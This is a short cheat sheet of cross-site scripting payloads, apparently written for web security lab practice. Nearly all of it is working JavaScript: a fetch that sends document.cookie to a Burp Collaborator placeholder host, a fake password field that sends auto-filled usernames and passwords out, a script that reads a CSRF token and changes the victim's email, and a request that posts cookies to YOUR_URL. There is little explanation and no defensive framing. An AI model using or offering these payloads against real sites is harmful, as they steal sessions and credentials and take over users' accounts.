# Exploiting cross-site scripting vulnerabilities

## To steal cookies

> `fetch('<https://BURP-COLLABORATOR-SUBDOMAIN>', {`  
> `method: 'POST',`  
> `mode: 'no-cors',`  
> `body:document.cookie});`

## To capture passwords

> NOTE  
> this technique is that it only works on users who have a password manager that performs password auto-fill.  

> `<input name=username id=username>`  
> `<input type=password name=password onchange="if(this.value.length)fetch('<https://BURP-COLLABORATOR-SUBDOMAIN>',{`  
> `method:'POST',`  
> `mode: 'no-cors',`  
> `body:username.value+':'+this.value });">`  

## To perform CSRF

> NOTE  
> Anything a legitimate user can do on a web site, you can probably do too with XSS.  

> `var req = new XMLHttpRequest();`  
> `req.onload = handleResponse;`  
> `req.open('get','/my-account',true);`  
> `req.send();`  
> `function handleResponse() {`  
> `var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];`  
> `var changeReq = new XMLHttpRequest();`  
> `changeReq.open('post', '/my-account/change-email', true);`  
> `changeReq.send('csrf='+token+'&email=test@test.com')`  
> `};`  

## Send a request to YOUR_URL

> `var req = new XMLHttpRequest();`  
> `req.open('post','YOUR_URL',true);`  
> `req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');`  
> `req.send('message='+document.cookie);`  
